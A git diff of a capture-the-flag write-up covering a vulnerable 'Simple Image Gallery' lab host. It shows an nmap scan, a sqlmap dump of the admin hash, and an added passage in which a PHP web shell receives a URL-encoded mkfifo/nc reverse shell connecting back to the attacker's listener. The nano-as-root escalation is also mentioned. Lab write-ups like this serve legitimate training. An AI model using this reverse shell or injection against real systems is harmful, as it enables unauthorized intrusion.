@@ -4,7 +4,7 @@
 
 
 <h3>1. Question: How many ports are open?</h3>  <br>
-Lets start with an nmap scan to get the number of open ports and also we may get a valueable port thats open in the server!
+Lets start with an nmap scan to get the number of open ports and also i may get a valueable port thats open in the server!
 <br>
 
 ```
@@ -21,27 +21,27 @@ PORT     STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 1.17 seconds
 ```
 
-We have 3 open ports in the server, now we got the answer to the first question, **3**
+The server have 3 open ports, now i got the answer to the first question, **3**
 
 <hr>
 
 <h3>2. Question: What's the name of the CMS?</h3>
 <br>
-Opening the website on port 80, we get an apache ubuntu default page, this doesn't help much.. 
-but we noticed that there is another web server running on port 8080! Lets check it!
+Opening the website on port 80, i get an apache ubuntu default page, this doesn't help much.. 
+but i noticed that there is another web server running on port 8080! Lets check it!
 
 Now the website provided us a login page and with the name of the CMS! **Simple Image Gallery**
 
 <hr>
 
 <h3>3. Question: What's the hash password of the admin user? </h3>
-When sending a login request, i noticed that we get a suspicious response:
+When sending a login request, i noticed that i get a suspicious response:
 
 ```
 {"status":"incorrect","last_qry":"SELECT * from users where username = 'admin' and password = md5('test') "}
 ```
 Login page maybe got some SQL injection vulnerability!
-Running sqlmap we can see it detected that the username paramater is vulnerable to an sql injection attack, now we could easily get the admin's passwords hash.
+Running sqlmap i can see it detected that the username paramater is vulnerable to an sql injection attack, now i could easily get the admin's passwords hash.
 After some time, sqlmap found the hash of the password
 ```
 $ sqlmap -r req.txt --dump
@@ -55,13 +55,25 @@ $ sqlmap -r req.txt --dump
 
 <hr>
 <h3>4. Question: What's the user flag?</h3>
-To get the user flag, we have to gain a shell on the system.
+To get the user flag, i have to gain a shell on the system.
 <br>
 I searched for the CMS name and found a possible RCE exploit on exploit-db:
 <a href = "https://www.exploit-db.com/exploits/50214"> https://www.exploit-db.com/exploits/50214 </a> <br>
-I downloaded this to my machine and i ran it. It successfully gave me a shell on the target system!
-<br><br>
-Only the user "mike" can read the user.txt, so we have to find a way to be mike!
+I downloaded this to my machine and i ran it. <br><br>
+The exploit uploaded a file to the server, which contained a ?cmd= paramter<br>
+
+Run netcat in listener mode, so the remote host could connect to my Kali:<br>
+```
+ncat -nlvp 8001
+```
+
+I pasted my netcat script in the cmd parameter and i successfully got a more stable netcat reverse shell!
+```
+http://10.10.191.82/gallery/uploads/1760716080_TagogdgiydphbhaodrhLetta.php?cmd=rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7Cbash+-i+2%3E%261%7Cnc+10.9.3.133+8001+%3E%2Ftmp%2Ff
+```
+
+<br>
+I got shell as www-data, and found the first flag in mike's home directory, but only the user "mike" can read the user.txt, so i have to find a way to be mike!
 
 ```
 www-data@ip-10-10-191-82:/home/mike$ ls -l
@@ -122,7 +134,7 @@ case $ans in
 esac
 ```
 Aha, so if i run it as root, and write "read" in the input box (which will the sh script provide) it will open a nano UI as root!<br>
-So basically if you have nano run as root, you can read any file on the system, and if we go with the /root/root.txt
+So basically if you have nano run as root, you can read any file on the system, and if i go with the /root/root.txt
 it will paste the root flag in to the nano editor
 <br>
 <br>
